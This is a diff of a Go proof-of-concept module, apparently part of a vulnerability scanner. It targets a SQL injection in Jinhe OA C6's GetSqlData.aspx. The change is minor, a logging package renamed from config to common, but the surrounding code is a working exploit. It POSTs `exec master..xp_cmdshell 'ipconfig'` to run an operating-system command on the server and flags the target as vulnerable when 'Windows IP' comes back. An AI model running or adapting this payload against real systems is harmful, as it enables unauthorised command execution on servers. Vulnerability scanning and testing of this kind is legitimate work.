@@ -1,7 +1,7 @@
 package poc
 
 import (
-	"PocSir/config"
+	"PocSir/common"
 	"bytes"
 	"crypto/tls"
 	"io"
@@ -29,7 +29,7 @@ func JinHeSql_Exec(target string) {
 	payload := []byte(`exec master..xp_cmdshell 'ipconfig'`)
 	req, err := http.NewRequest("POST", pocUrl, bytes.NewBuffer(payload))
 	if err != nil {
-		config.ErrMsg.Printf("[-]Error creating request: %v\n", err)
+		common.ErrMsg.Printf("[-]Error creating request: %v\n", err)
 		return
 	}
 	for key, value := range headers {
@@ -38,16 +38,16 @@ func JinHeSql_Exec(target string) {
 
 	resp, err := client.Do(req)
 	if err != nil {
-		config.ErrMsg.Printf("[-]%s is timeout\n", target)
+		common.ErrMsg.Printf("[-]%s is timeout\n", target)
 		return
 	}
 	defer resp.Body.Close()
 	data, _ := io.ReadAll(resp.Body)
 	if resp.StatusCode == http.StatusOK && strings.Contains(string(data), "Windows IP") {
-		config.Right.Printf("[+]%s存在金和OA C6-GetSqlData.aspx SQL注入漏洞\n", target)
-		config.TextPut.Printf(string(data) + "\n")
+		common.Right.Printf("[+]%s存在金和OA C6-GetSqlData.aspx SQL注入漏洞\n", target)
+		common.TextPut.Printf(string(data) + "\n")
 	} else {
-		config.ErrMsg.Printf("[-]%s不存在存在金和OA C6-GetSqlData.aspx SQL注入漏洞\n", target)
+		common.ErrMsg.Printf("[-]%s不存在存在金和OA C6-GetSqlData.aspx SQL注入漏洞\n", target)
 	}
 
 }
